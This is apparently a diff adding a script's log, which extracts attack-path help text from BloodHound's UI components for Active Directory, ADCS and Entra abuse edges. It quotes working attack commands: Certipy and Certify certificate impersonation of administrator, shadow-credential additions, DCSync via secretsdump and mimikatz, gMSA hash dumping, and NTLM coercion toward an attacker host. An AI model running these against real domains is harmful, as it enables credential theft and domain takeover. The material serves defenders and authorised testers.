@@ -1,0 +1,2335 @@
+Processing directory: ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/ADCSESC6b
+Found LinuxAbuse.tsx in ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/ADCSESC6b
+Extracted HTML-like content from ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/ADCSESC6b/LinuxAbuse.tsx:
+            <Typography variant='body2'>An attacker may perform this attack in the following steps:</Typography>
+            <Typography variant='body2'>
+                <Box component='span' sx={{ fontWeight: 'bold' }}>
+                    Step 1:
+                </Box>{' '}
+                Use Certipy to request enrollment in the affected template, specifying the target enterprise CA and
+                target principal to impersonate:
+            </Typography>
+            <Typography component={'pre'}>
+                {
+                    'certipy req -u john@corp.local -p Passw0rd -ca corp-DC-CA -target ca.corp.local -template ESC6 -upn administrator@corp.local'
+                }
+            </Typography>
+            <Typography variant='body2'>
+                If the enrollment fails with an error message stating that the Email or DNS name is unavailable and
+                cannot be added to the Subject or Subject Alternate name, then it is because the enrollee principal does
+                not have their 'mail' or 'dNSHostName' attribute set, which is required by the certificate template. The
+                'mail' attribute can be set on both user and computer objects but the 'dNSHostName' attribute can only
+                be set on computer objects. Computers have validated write permission to their own 'dNSHostName'
+                attribute by default, but neither users nor computers can write to their own 'mail' attribute by
+                default.
+            </Typography>
+            <Typography variant='body2'>
+                <Box component='span' sx={{ fontWeight: 'bold' }}>
+                    Step 2:
+                </Box>{' '}
+                Request a ticket granting ticket (TGT) from the domain, specifying the certificate created in Step 1 and
+                the IP of a domain controller:
+            </Typography>
+            <Typography component={'pre'}>{'certipy auth -pfx administrator.pfx -dc-ip 172.16.126.128'}</Typography>
+
+
+Found WindowsAbuse.tsx in ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/ADCSESC6b
+Extracted HTML-like content from ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/ADCSESC6b/WindowsAbuse.tsx:
+            <Typography variant='body2'>An attacker may perform this attack in the following steps:</Typography>
+            <Typography variant='body2'>
+                <Box component='span' sx={{ fontWeight: 'bold' }}>
+                    Step 1:
+                </Box>{' '}
+                Use Certify to request enrollment int he affected template, specifying the affected certification
+                authority and target principal to impersonate:
+            </Typography>
+            <Typography component={'pre'}>
+                {
+                    '.\\Certify.exe request /ca:rootdomaindc.forestroot.com\\forestroot-RootDomainDC-CA /template:ESC6 /altname:forestrootda'
+                }
+            </Typography>
+            <Typography variant='body2'>
+                If the enrollment fails with an error message stating that the Email or DNS name is unavailable and
+                cannot be added to the Subject or Subject Alternate name, then it is because the enrollee principal does
+                not have their 'mail' or 'dNSHostName' attribute set, which is required by the certificate template. The
+                'mail' attribute can be set on both user and computer objects but the 'dNSHostName' attribute can only
+                be set on computer objects. Computers have validated write permission to their own 'dNSHostName'
+                attribute by default, but neither users nor computers can write to their own 'mail' attribute by
+                default.
+            </Typography>
+            <Typography variant='body2'>
+                <Box component='span' sx={{ fontWeight: 'bold' }}>
+                    Step 2:
+                </Box>{' '}
+                Convert the emitted certificate to PFX format:
+            </Typography>
+            <Typography component={'pre'}>{'certutil.exe -MergePFX .\\cert.pem .\\cert.pfx'}</Typography>
+            <Typography variant='body2'>
+                <Box component='span' sx={{ fontWeight: 'bold' }}>
+                    Step 3:
+                </Box>{' '}
+                Use Certipy to connect to the domain controller via Schannel, specifying the PFX-formatted certificate
+                created in Step 2:
+            </Typography>
+            <Typography component={'pre'}>{'certipy auth -pfx .\\cert.pfx -dc-ip 10.4.0.4 -ldap-shell'}</Typography>
+
+
+Processing directory: ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/ADCSESC9a
+Found LinuxAbuse.tsx in ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/ADCSESC9a
+Extracted HTML-like content from ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/ADCSESC9a/LinuxAbuse.tsx:
+            <Typography variant='body2'>An attacker may perform this attack in the following steps:</Typography>
+            {step1}
+            {step2}
+            {step3}
+            {step4}
+            {step5}
+            {step6}
+
+
+Found WindowsAbuse.tsx in ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/ADCSESC9a
+Extracted HTML-like content from ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/ADCSESC9a/WindowsAbuse.tsx:
+            <Typography variant='body2'>An attacker may perform this attack in the following steps:</Typography>
+            {step1}
+            {step2}
+            {step3}
+            {step4}
+            {step5}
+            {step6}
+            {step7}
+
+
+Processing directory: ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/SyncedToADUser
+Found LinuxAbuse.tsx in ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/SyncedToADUser
+Extracted HTML-like content from ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/SyncedToADUser/LinuxAbuse.tsx:
+        <Typography variant='body2'>
+            An attacker may authenticate as the on-prem AD user using the Entra user’s credentials, for example by
+            key-logging the user’s password, or by changing the Entra user’s password and waiting for the password
+            write-back operation to complete.
+        </Typography>
+
+
+Found WindowsAbuse.tsx in ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/SyncedToADUser
+Extracted HTML-like content from ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/SyncedToADUser/WindowsAbuse.tsx:
+        <Typography variant='body2'>
+            An attacker may authenticate as the on-prem AD user using the Entra user’s credentials, for example by
+            key-logging the user’s password, or by changing the Entra user’s password and waiting for the password
+            write-back operation to complete.
+        </Typography>
+
+
+Skipping non-directory: ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/index.tsx
+Processing directory: ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/AZMGAddMember
+Found Abuse.tsx in ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/AZMGAddMember
+Processing directory: ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/SameForestTrust
+Found Abuse.tsx in ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/SameForestTrust
+Processing directory: ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/AZMGGrantRole
+Found Abuse.tsx in ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/AZMGGrantRole
+Processing directory: ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/AddKeyCredentialLink
+Found LinuxAbuse.tsx in ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/AddKeyCredentialLink
+Extracted HTML-like content from ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/AddKeyCredentialLink/LinuxAbuse.tsx:
+            <Typography variant='body2'>
+                To abuse this permission, use{' '}
+                <Link target='_blank' rel='noopener' href='https://github.com/ShutdownRepo/pywhisker'>
+                    pyWhisker
+                </Link>
+                .
+            </Typography>
+
+            <Typography component={'pre'}>
+                {
+                    'pywhisker.py -d "domain.local" -u "controlledAccount" -p "somepassword" --target "targetAccount" --action "add"'
+                }
+            </Typography>
+
+            <Typography variant='body2'>For other optional parameters, view the pyWhisker documentation.</Typography>
+
+
+Found WindowsAbuse.tsx in ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/AddKeyCredentialLink
+Extracted HTML-like content from ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/AddKeyCredentialLink/WindowsAbuse.tsx:
+            <Typography variant='body2'>To abuse this permission, use Whisker. </Typography>
+
+            <Typography variant='body2'>
+                You may need to authenticate to the Domain Controller as{' '}
+                {sourceType === 'User' || sourceType === 'Computer'
+                    ? `${sourceName} if you are not running a process as that user/computer`
+                    : `a member of ${sourceName} if you are not running a process as a member`}
+            </Typography>
+
+            <Typography component={'pre'}>{'Whisker.exe add /target:<TargetPrincipal>'}</Typography>
+
+            <Typography variant='body2'>For other optional parameters, view the Whisker documentation.</Typography>
+
+
+Processing directory: ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/AZMGGrantAppRoles
+Found Abuse.tsx in ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/AZMGGrantAppRoles
+Processing directory: ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/NTAuthStoreFor
+Found LinuxAbuse.tsx in ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/NTAuthStoreFor
+Extracted HTML-like content from ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/NTAuthStoreFor/LinuxAbuse.tsx:
+        <Typography variant='body2'>
+            An attacker may perform several attacks that rely on certificates being stored in the NTAuthStore, such as
+            ESC1. This relationship alone is not enough to escalate rights or impersonate other principals. This
+            relationship may contribute to other relationships and attributes, from which an escalation opportunity may
+            emerge.
+        </Typography>
+
+
+Found WindowsAbuse.tsx in ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/NTAuthStoreFor
+Extracted HTML-like content from ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/NTAuthStoreFor/WindowsAbuse.tsx:
+        <Typography variant='body2'>
+            An attacker may perform several attacks that rely on certificates being stored in the NTAuthStore, such as
+            ESC1. This relationship alone is not enough to escalate rights or impersonate other principals. This
+            relationship may contribute to other relationships and attributes, from which an escalation opportunity may
+            emerge.
+        </Typography>
+
+
+Processing directory: ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/DCSync
+Found LinuxAbuse.tsx in ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/DCSync
+Extracted HTML-like content from ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/DCSync/LinuxAbuse.tsx:
+            <Typography variant='body2'>
+                You may perform a dcsync attack to get the password hash of an arbitrary principal using impacket's
+                secretsdump.py example script:
+            </Typography>
+
+            <Typography component={'pre'}>
+                {"secretsdump.py 'testlab.local'/'Administrator':'Password'@'DOMAINCONTROLLER'"}
+            </Typography>
+
+            <Typography variant='body2'>
+                You can also perform the more complicated ExtraSids attack to hop domain trusts. For information on this
+                see the blog post by harmj0y in the references tab.
+            </Typography>
+
+
+Found WindowsAbuse.tsx in ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/DCSync
+Extracted HTML-like content from ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/DCSync/WindowsAbuse.tsx:
+            <Typography variant='body2'>
+                You may perform a dcsync attack to get the password hash of an arbitrary principal using mimikatz:
+            </Typography>
+            <Typography component={'pre'}>{'lsadump::dcsync /domain:testlab.local /user:Administrator'}</Typography>
+            <Typography variant='body2'>
+                You can also perform the more complicated ExtraSids attack to hop domain trusts. For information on this
+                see the blog post by harmj0y in the references tab.
+            </Typography>
+
+
+Processing directory: ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/GetChangesAll
+Found LinuxAbuse.tsx in ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/GetChangesAll
+Extracted HTML-like content from ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/GetChangesAll/LinuxAbuse.tsx:
+            <Typography variant='body2'>
+                You may perform a dcsync attack to get the password hash of an arbitrary principal using impacket's
+                secretsdump.py example script:
+            </Typography>
+
+            <Typography component={'pre'}>
+                {"secretsdump.py 'testlab.local'/'Administrator':'Password'@'DOMAINCONTROLLER'"}
+            </Typography>
+
+            <Typography variant='body2'>
+                You can also perform the more complicated ExtraSids attack to hop domain trusts. For information on this
+                see the blog post by harmj0y in the references tab.
+            </Typography>
+
+
+Found WindowsAbuse.tsx in ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/GetChangesAll
+Extracted HTML-like content from ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/GetChangesAll/WindowsAbuse.tsx:
+            <Typography variant='body2'>
+                With both GetChanges and GetChangesAll privileges in BloodHound, you may perform a dcsync attack to get
+                the password hash of an arbitrary principal using mimikatz:
+            </Typography>
+            <Typography component={'pre'}>{'lsadump::dcsync /domain:testlab.local /user:Administrator'}</Typography>
+            <Typography variant='body2'>
+                You can also perform the more complicated ExtraSids attack to hop domain trusts. For information on this
+                see the blog post by harmj0y in the references tab.
+            </Typography>
+
+
+Processing directory: ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/RootCAFor
+Found LinuxAbuse.tsx in ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/RootCAFor
+Extracted HTML-like content from ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/RootCAFor/LinuxAbuse.tsx:
+        <Typography variant='body2'>
+            An attacker may perform several attacks that rely on the existence of a root CA, such as ESC1. This edge
+            alone is not enough to escalate rights or impersonate other principals. This edge may contribute to other
+            edges and attributes, from which an escalation opportunity may emerge.
+        </Typography>
+
+
+Found WindowsAbuse.tsx in ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/RootCAFor
+Extracted HTML-like content from ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/RootCAFor/WindowsAbuse.tsx:
+        <Typography variant='body2'>
+            An attacker may perform several attacks that rely on the existence of a root CA, such as ESC1. This edge
+            alone is not enough to escalate rights or impersonate other principals. This edge may contribute to other
+            edges and attributes, from which an escalation opportunity may emerge.
+        </Typography>
+
+
+Processing directory: ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/SQLAdmin
+Found Abuse.tsx in ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/SQLAdmin
+Processing directory: ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/MemberOf
+Found Abuse.tsx in ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/MemberOf
+Processing directory: ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/AZGetKeys
+Found Abuse.tsx in ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/AZGetKeys
+Processing directory: ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/CoerceAndRelayNTLMToADCS
+Found LinuxAbuse.tsx in ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/CoerceAndRelayNTLMToADCS
+Extracted HTML-like content from ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/CoerceAndRelayNTLMToADCS/LinuxAbuse.tsx:
+            <Typography variant={'body2'}>
+                1. Start the Relay Server The NTLM relay can be executed with{' '}
+                <a href={'https://github.com/fortra/impacket/blob/master/examples/ntlmrelayx.py'}>ntlmrelayx.py</a>. To
+                relay to the enterprise CA and enroll a certificate, specify the HTTP(S) endpoint as the target and use
+                the arguments
+                <CodeController>{'--adcs --template <TEMPLATE_NAME>.'}</CodeController>
+            </Typography>
+
+            <Typography variant={'body2'}>
+                2. Coerce the Target Computer Several coercion methods are documented here:{' '}
+                <a href={'https://github.com/p0dalirius/windows-coerced-authentication-methods'}>
+                    Windows Coerced Authentication Methods
+                </a>
+                . Examples of tools include:
+                <a href={'https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py'}>printerbug.py</a>
+                <a href={'https://github.com/topotam/PetitPotam'}>PetitPotam</a>
+                To trigger WebClient coercion (instead of regular SMB coercion), the listener must use a WebDAV
+                Connection String format: \\SERVER_NETBIOS@PORT/PATH/TO/FILE.
+            </Typography>
+
+
+Found WindowsAbuse.tsx in ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/CoerceAndRelayNTLMToADCS
+Extracted HTML-like content from ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/CoerceAndRelayNTLMToADCS/WindowsAbuse.tsx:
+            <Typography variant='body2'>
+                1: Start the Relay Server The NTLM relay can be executed with Inveigh.
+            </Typography>
+            <Typography variant='body2'>
+                2: Coerce the Target Computer Several coercion methods are documented here:{' '}
+                <a href={'https://github.com/p0dalirius/windows-coerced-authentication-methods'}>
+                    Windows Coerced Authentication Methods
+                </a>
+                . Examples of tools include:
+                <a href={'https://github.com/leechristensen/SpoolSample'}>SpoolSample</a>
+                <a href={'https://github.com/topotam/PetitPotam'}>PetitPotam</a>
+                To trigger WebClient coercion (instead of regular SMB coercion), the listener must use a WebDAV
+                Connection String format: \\SERVER_NETBIOS@PORT/PATH/TO/FILE. Example: SpoolSample.exe "VICTIM_IP"
+                "ATTACKER_NETBIOS@PORT/file.txt"
+            </Typography>
+
+
+Processing directory: ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/SpoofSIDHistory
+Found Abuse.tsx in ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/SpoofSIDHistory
+Processing directory: ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/AdminTo
+Found Abuse.tsx in ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/AdminTo
+Processing directory: ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/ManageCertificates
+Found LinuxAbuse.tsx in ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/ManageCertificates
+Extracted HTML-like content from ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/ManageCertificates/LinuxAbuse.tsx:
+        <Typography variant='body2'>
+            This relationship alone is not enough to perform a privilege escalation or impersonation primitive. This
+            relationship may contribute to other relationships and attributes, from which an escalation opportunity may
+            emerge.
+        </Typography>
+
+
+Found WindowsAbuse.tsx in ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/ManageCertificates
+Extracted HTML-like content from ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/ManageCertificates/WindowsAbuse.tsx:
+        <Typography variant='body2'>
+            This relationship alone is not enough to perform a privilege escalation or impersonation primitive. This
+            relationship may contribute to other relationships and attributes, from which an escalation opportunity may
+            emerge.
+        </Typography>
+
+
+Processing directory: ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/AZKeyVaultKVContributor
+Found Abuse.tsx in ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/AZKeyVaultKVContributor
+Processing directory: ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/OIDGroupLink
+Found LinuxAbuse.tsx in ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/OIDGroupLink
+Extracted HTML-like content from ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/OIDGroupLink/LinuxAbuse.tsx:
+        <Typography variant='body2'>
+            An attacker may perform the ADCS ESC13 abuse which relies on the OID group link. This relationship alone is
+            not enough to escalate rights or impersonate other principals.
+        </Typography>
+
+
+Found WindowsAbuse.tsx in ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/OIDGroupLink
+Extracted HTML-like content from ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/OIDGroupLink/WindowsAbuse.tsx:
+        <Typography variant='body2'>
+            An attacker may perform the ADCS ESC13 abuse which relies on the OID group link. This relationship alone is
+            not enough to escalate rights or impersonate other principals.
+        </Typography>
+
+
+Processing directory: ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/AZAddMembers
+Found Abuse.tsx in ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/AZAddMembers
+Processing directory: ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/AZAvereContributor
+Found Abuse.tsx in ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/AZAvereContributor
+Processing directory: ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/Enroll
+Found LinuxAbuse.tsx in ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/Enroll
+Extracted HTML-like content from ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/Enroll/LinuxAbuse.tsx:
+            <Typography variant='body2'>Certipy can be used to enroll a certificate:</Typography>
+            <Typography component={'pre'}>
+                {'certipy req -u USER@CORP.LOCAL -p PWD -ca CA-NAME -target SERVER -template TEMPLATE'}
+            </Typography>
+            <Typography variant='body2'>
+                The following requirements must be met for a principal to be able to enroll a certificate:
+                <br />
+                1) The principal has enrollment rights on a certificate template
+                <br />
+                2) The certificate template is published on an enterprise CA
+                <br />
+                3) The principal has Enroll permission on the enterprise CA
+                <br />
+                4) The principal meets the issuance requirements and the requirements for subject name and subject
+                alternative name defined by the template
+            </Typography>
+
+
+Found WindowsAbuse.tsx in ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/Enroll
+Extracted HTML-like content from ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/Enroll/WindowsAbuse.tsx:
+            <Typography variant='body2'>Certify can be used to enroll a certificate:</Typography>
+            <Typography component={'pre'}>{'Certify.exe request /ca:SERVER\\CA-NAME /template:TEMPLATE'}</Typography>
+            <Typography variant='body2'>
+                The following requirements must be met for a principal to be able to enroll a certificate:
+                <br />
+                1) The principal has enrollment rights on a certificate template
+                <br />
+                2) The certificate template is published on an enterprise CA
+                <br />
+                3) The principal has Enroll permission on the enterprise CA
+                <br />
+                4) The principal meets the issuance requirements and the requirements for subject name and subject
+                alternative name defined by the template
+            </Typography>
+
+
+Processing directory: ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/DelegatedEnrollmentAgent
+Found LinuxAbuse.tsx in ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/DelegatedEnrollmentAgent
+Extracted HTML-like content from ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/DelegatedEnrollmentAgent/LinuxAbuse.tsx:
+        <Typography variant='body2'>
+            An attacker may perform an ADCS ESC3 attack that relies on this DelegatedEnrollmentAgent relationship. This
+            relationship alone is not enough to escalate rights or impersonate other principals.
+        </Typography>
+
+
+Found WindowsAbuse.tsx in ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/DelegatedEnrollmentAgent
+Extracted HTML-like content from ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/DelegatedEnrollmentAgent/WindowsAbuse.tsx:
+        <Typography variant='body2'>
+            An attacker may perform an ADCS ESC3 attack that relies on this DelegatedEnrollmentAgent relationship. This
+            relationship alone is not enough to escalate rights or impersonate other principals.
+        </Typography>
+
+
+Processing directory: ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/HasSIDHistory
+Found Abuse.tsx in ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/HasSIDHistory
+Processing directory: ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/CodeController
+Processing directory: ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/AZPrivilegedRoleAdmin
+Found Abuse.tsx in ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/AZPrivilegedRoleAdmin
+Processing directory: ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/AZGlobalAdmin
+Found Abuse.tsx in ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/AZGlobalAdmin
+Processing directory: ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/AZAutomationContributor
+Found Abuse.tsx in ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/AZAutomationContributor
+Processing directory: ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/ReadGMSAPassword
+Found LinuxAbuse.tsx in ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/ReadGMSAPassword
+Extracted HTML-like content from ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/ReadGMSAPassword/LinuxAbuse.tsx:
+            <Typography variant='body2'>
+                There are several ways to abuse the ability to read the GMSA password. The most straight forward abuse
+                is possible when the GMSA is currently logged on to a computer, which is the intended behavior for a
+                GMSA. If the GMSA is logged on to the computer account which is granted the ability to retrieve the
+                GMSA's password, simply steal the token from the process running as the GMSA, or inject into that
+                process.
+            </Typography>
+            <Typography variant='body2'>
+                If the GMSA is not logged onto the computer, you may create a scheduled task or service set to run as
+                the GMSA. The computer account will start the sheduled task or service as the GMSA, and then you may
+                abuse the GMSA logon in the same fashion you would a standard user running processes on the machine (see
+                the "HasSession" help modal for more details).
+            </Typography>
+            <Typography variant='body2'>
+                Finally, it is possible to remotely retrieve the password for the GMSA and convert that password to its
+                equivalent NT hash.
+                <Link target='_blank' rel='noopener' href='https://github.com/micahvandeusen/gMSADumper'>
+                    gMSADumper.py
+                </Link>{' '}
+                can be used for that purpose.
+            </Typography>
+
+            <Typography component={'pre'}>{"gMSADumper.py -u 'user' -p 'password' -d 'domain.local'"}</Typography>
+
+            <Typography variant='body2'>
+                At this point you are ready to use the NT hash the same way you would with a regular user account. You
+                can perform pass-the-hash, overpass-the-hash, or any other technique that takes an NT hash as an input.
+            </Typography>
+
+
+Found WindowsAbuse.tsx in ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/ReadGMSAPassword
+Extracted HTML-like content from ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/ReadGMSAPassword/WindowsAbuse.tsx:
+            <Typography variant='body2'>
+                There are several ways to abuse the ability to read the GMSA password. The most straight forward abuse
+                is possible when the GMSA is currently logged on to a computer, which is the intended behavior for a
+                GMSA. If the GMSA is logged on to the computer account which is granted the ability to retrieve the
+                GMSA's password, simply steal the token from the process running as the GMSA, or inject into that
+                process.
+            </Typography>
+            <Typography variant='body2'>
+                If the GMSA is not logged onto the computer, you may create a scheduled task or service set to run as
+                the GMSA. The computer account will start the sheduled task or service as the GMSA, and then you may
+                abuse the GMSA logon in the same fashion you would a standard user running processes on the machine (see
+                the "HasSession" help modal for more details).
+            </Typography>
+            <Typography variant='body2'>
+                Finally, it is possible to remotely retrieve the password for the GMSA and convert that password to its
+                equivalent NT hash, then perform overpass-the-hash to retrieve a Kerberos ticket for the GMSA:
+            </Typography>
+            <List>
+                <ListItem>
+                    <ListItemText>
+                        Build GMSAPasswordReader.exe from its source: https://github.com/rvazarkar/GMSAPasswordReader
+                    </ListItemText>
+                </ListItem>
+                <ListItem>
+                    <ListItemText>
+                        Drop GMSAPasswordReader.exe to disk. If using Cobalt Strike, load and run this binary using
+                        execute-assembly
+                    </ListItemText>
+                </ListItem>
+                <ListItem>
+                    <ListItemText>
+                        Use GMSAPasswordReader.exe to retrieve the NT hash for the GMSA. You may have more than one NT
+                        hash come back, one for the "old" password and one for the "current" password. It is possible
+                        that either value is valid:
+                    </ListItemText>
+                </ListItem>
+            </List>
+
+            <Typography component={'pre'}>{'gmsapasswordreader.exe --accountname gmsa-jkohler'}</Typography>
+
+            <Typography variant='body2'>
+                At this point you are ready to use the NT hash the same way you would with a regular user account. You
+                can perform pass-the-hash, overpass-the-hash, or any other technique that takes an NT hash as an input.
+            </Typography>
+
+
+Processing directory: ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/EnrollOnBehalfOf
+Found LinuxAbuse.tsx in ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/EnrollOnBehalfOf
+Extracted HTML-like content from ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/EnrollOnBehalfOf/LinuxAbuse.tsx:
+        <Typography variant='body2'>
+            An attacker may perform an ADCS ESC3 attack that relies on this EnrollOnBehalfOf relationship. This
+            relationship alone is not enough to escalate rights or impersonate other principals.
+        </Typography>
+
+
+Found WindowsAbuse.tsx in ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/EnrollOnBehalfOf
+Extracted HTML-like content from ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/EnrollOnBehalfOf/WindowsAbuse.tsx:
+        <Typography variant='body2'>
+            An attacker may perform an ADCS ESC3 attack that relies on this EnrollOnBehalfOf relationship. This
+            relationship alone is not enough to escalate rights or impersonate other principals.
+        </Typography>
+
+
+Processing directory: ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/AZAppAdmin
+Found Abuse.tsx in ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/AZAppAdmin
+Processing directory: ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/CanPSRemote
+Found Abuse.tsx in ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/CanPSRemote
+Processing directory: ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/Owns
+Found LinuxAbuse.tsx in ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/Owns
+Extracted HTML-like content from ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/Owns/LinuxAbuse.tsx:
+                    <Typography variant='body2'>No abuse information available for this node type.</Typography>
+
+
+Found WindowsAbuse.tsx in ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/Owns
+Extracted HTML-like content from ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/Owns/WindowsAbuse.tsx:
+                    <Typography variant='body2'>No abuse information available for this node type.</Typography>
+
+
+Processing directory: ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/AZRoleEligible
+Processing directory: ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/IssuedSignedBy
+Found LinuxAbuse.tsx in ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/IssuedSignedBy
+Extracted HTML-like content from ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/IssuedSignedBy/LinuxAbuse.tsx:
+        <Typography variant='body2'>
+            An attacker may perform several attacks that rely on the certificate chain, such as ESC1. This relationship
+            alone is not enough to escalate rights or impersonate other principals. This relationship may contribute to
+            other relationships and attributes, from which an escalation opportunity may emerge.
+        </Typography>
+
+
+Found WindowsAbuse.tsx in ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/IssuedSignedBy
+Extracted HTML-like content from ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/IssuedSignedBy/WindowsAbuse.tsx:
+        <Typography variant='body2'>
+            An attacker may perform several attacks that rely on the certificate chain, such as ESC1. This relationship
+            alone is not enough to escalate rights or impersonate other principals. This relationship may contribute to
+            other relationships and attributes, from which an escalation opportunity may emerge.
+        </Typography>
+
+
+Processing directory: ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/AZMGApplication_ReadWrite_All
+Found Abuse.tsx in ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/AZMGApplication_ReadWrite_All
+Processing directory: ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/AllExtendedRights
+Found LinuxAbuse.tsx in ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/AllExtendedRights
